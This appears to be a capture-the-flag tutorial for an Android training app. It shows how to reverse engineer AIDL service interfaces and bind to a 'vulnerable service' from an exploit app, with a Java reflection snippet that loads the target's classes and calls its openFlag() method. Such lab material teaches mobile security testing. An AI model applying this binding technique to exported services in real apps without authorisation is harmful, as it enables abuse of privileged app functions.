## AIDL

Services based on [AIDL](https://developer.android.com/develop/background-work/services/aidl) (Android Interface Definition Language) can be easily recognised by looking at the `onBind()` method that returns some kind of `.Stub` binder.

These services are based on AIDL files, which look similar to Java, but they are written in the "Android Interface Definition Language".

```java title:IFlag28Interface.aidl
package io.hextree.attacksurface.services;

interface IFlag28Interface {
    boolean openFlag();
}
```

During compilation this `.aidl` definition is then translated into an actual `.java` class that implements the low-level binder code to interact with the service.

## Reverse AIDL services

When we want to interact with such a service, **we want to reverse engineer** the original `.aidl` file. To reverse engineer the original .aidl code, we can look into the generated service interface code.

1. Look for the `DESCRIPTOR` variable, as it contains the original package path and .aidl filename
2. The AIDL methods can be derived from the interface methods with the `throws RemoteException`
3. The original method order is shown by the `TRANSACTION_` integers

Once reversed and understood an .aidl file, we should integrate it into out PoC/exploit application in order to be able to bind our application to the vulnerable service.

### Bind to AIDL Service with .aidl File

If we are able to reconstruct a valid .aidl file, we can use it inside out application.

We have to enable aidl, add the aidl file to the /aidl folder, build the project and finally implement our custom logic calling the `bindService()` method and binding to the vulnerable service.

Adding an .aidl file to your own project can be annoying. Another method that appears more complex at first, is actually quite convenient. 
### Bind to AIDL Service with ClassLoader

By loading the class directly from the target app, **we can just invoke the functions we need** and do not have to bother about method order or package names.

Here is an example code snippet to dynamically load the `IFlag28Interface` interface class from the `io.hextree.attacksurface` app, and invoke the `openFlag()` method through the service.

```java title:externalClassLoader.java
ServiceConnection mConnection = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // Load the class dynamically
        ClassLoader classLoader = getForeignClassLoader(Flag28Activity.this, "io.hextree.attacksurface");
        Class<?> iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");

        Class<?> stubClass = null;
        for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()) {
            if (innerClass.getSimpleName().equals("Stub")) {
                stubClass = innerClass;
                break;
            }
        }

        // Get the asInterface method
        Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);

        // Invoke the asInterface method to get the instance of IRemoteService
        Object iRemoteService = asInterfaceMethod.invoke(null, service);

        // Call the init method and get the returned string
        Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod("openFlag");
        boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService);
    }
}
```